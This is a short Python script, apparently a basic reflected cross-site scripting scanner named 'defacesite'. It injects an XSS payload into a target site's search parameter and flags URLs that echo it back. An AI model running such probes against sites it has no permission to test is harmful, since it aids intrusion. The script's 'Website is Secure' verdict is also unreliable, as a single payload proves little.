import requests

def defacesite(target_url):
    payloads = ["'\"><img src=x onerror=alert('XSS')>"]
    vulnerable_urls = []

    for payload in payloads:
        test_url = f"{target_url}?search={payload}"
        try:
            response = requests.get(test_url)
            
            if any(payload in response.text for payload in payloads):
                vulnerable_urls.append(test_url)
        
        except requests.RequestException:
            continue

    if vulnerable_urls == []:
        return 200, "Website is Secure. No vulnurablity found"
    else:
        return 202, vulnerable_urls